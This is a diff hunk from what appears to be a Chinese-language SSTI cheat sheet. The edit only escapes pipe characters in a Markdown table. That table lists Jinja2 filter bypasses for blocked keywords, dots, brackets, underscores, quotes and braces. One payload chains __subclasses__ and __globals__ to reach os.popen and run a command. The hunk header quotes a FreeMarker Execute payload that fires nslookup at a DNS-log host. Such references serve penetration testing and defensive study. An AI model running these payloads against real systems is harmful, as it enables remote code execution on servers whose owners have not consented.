@@ -221,8 +221,8 @@ ${"freemarker.template.utility.Execute"?new()("nslookup <dnslog>")}
 | 拦什么 | 绕过 |
 |---|---|
 | 关键字 `class` / `globals` / `os` / `popen` | 字符串拼接：`__cl`+`ass__`；或用 `request.args` 传参：`{{ ''[request.args.a] }}&a=__class__` |
-| 点号 `.` | `{{ ''|attr('__class__') }}` / `{{ ''['__class__'] }}` |
-| 中括号 `[` `]` | `{{ ''.__class__.__mro__|list|attr('__getitem__')(1) }}` |
+| 点号 `.` | `{{ ''\|attr('__class__') }}` / `{{ ''['__class__'] }}` |
+| 中括号 `[` `]` | `{{ ''.__class__.__mro__\|list\|attr('__getitem__')(1) }}` |
 | 下划线 `_` | `{{ ''[request.args.a][request.args.b] }}&a=__class__&b=__mro__`；或十六进制/Unicode 编码 |
 | 引号 `'` `"` | `{{ [].__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[request.args.o].popen(request.args.c).read() }}&o=os&c=id` |
 | `{{` `}}` 被拦 | 换引擎语法：`${}` `#{}` `<%%>`；或换行/制表符插入 `{\n{7*7}\n}` |
